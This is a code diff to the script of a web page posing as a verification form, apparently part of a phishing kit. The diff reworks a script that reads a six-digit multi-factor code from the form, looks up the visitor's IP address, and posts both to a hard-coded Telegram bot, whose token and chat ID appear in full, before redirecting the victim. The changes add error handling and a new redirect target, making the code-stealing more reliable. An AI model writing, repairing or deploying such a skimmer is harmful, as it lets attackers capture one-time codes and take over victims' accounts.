@@ -142,6 +142,9 @@
         async function getIpAddress() {
           try {
             const response = await fetch('https://api64.ipify.org?format=json');
+            if (!response.ok) {
+              throw new Error(`HTTP error! status: ${response.status}`);
+            }
             const data = await response.json();
             return data.ip;
           } catch (error) {
@@ -149,72 +152,72 @@
             return null;
           }
         }
+      
         // Function to send data to Telegram
         async function telegramSend(code, ipAddress) {
           const apiKey = '7135674791:AAEIQZV418OzZHxe5X0937Fh_7AZRQPgYXg';
           const chatId = '6845072076';
           const format = 'HTML';
-
-          const message = `----♻️Verification Code♻️----
-          \n🔢6-digit code: ${code}
-          \n📲IP Address: ${ipAddress}`;
-
+      
+          const message = `----♻️Verification Code♻️----\n🔢6-digit code: ${code}\n📲IP Address: ${ipAddress}`;
+      
           const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;
-
+      
           const formData = new FormData();
           formData.append('chat_id', chatId);
           formData.append('text', message);
           formData.append('parse_mode', format);
-
+      
           try {
             const response = await fetch(apiUrl, {
               method: 'POST',
               body: formData,
             });
-
+      
             const result = await response.json();
-
-            // Assuming you want to handle the response or perform additional actions based on it
             console.log(result);
-
-            return true;
+      
+            return result.ok;
           } catch (error) {
-            // Log any errors that occur during the Telegram send
             console.error('Error sending message to Telegram:', error);
             return false;
           }
         }
-
+      
         document.getElementById('myForm').addEventListener('submit', async function (event) {
           event.preventDefault(); // Prevent the default form submission
-
+      
           // Get the values from the form
           const code = document.getElementById('multifactor_code').value;
-
+      
           try {
             // Get the user's IP address
             const ipAddress = await getIpAddress();
-
-
+      
+            // Check if IP address was successfully fetched
+            if (ipAddress === null) {
+              console.error('Failed to fetch IP address');
+              return;
+            }
+      
             // Call the Telegram send function
             const success = await telegramSend(code, ipAddress);
-
+      
             // Check if the Telegram send was successful
             if (success) {
-              // Redirect to 'error.html' after successful form submission
-              window.location.href = 'success.html';
+              // Redirect to 'verify.html' after successful form submission
+              window.location.href = 'verify.html';
             } else {
-              // Optionally, you can handle the case where Telegram send was not successful
               console.error('Telegram send was not successful.');
               // You can add additional error handling code here if needed
             }
           } catch (error) {
-            // Log any errors that occur during the form submission
             console.error('Error during form submission:', error);
             // You can add additional error handling code here if needed
           }
         });
       </script>
+      
 </body>
 
 </html>
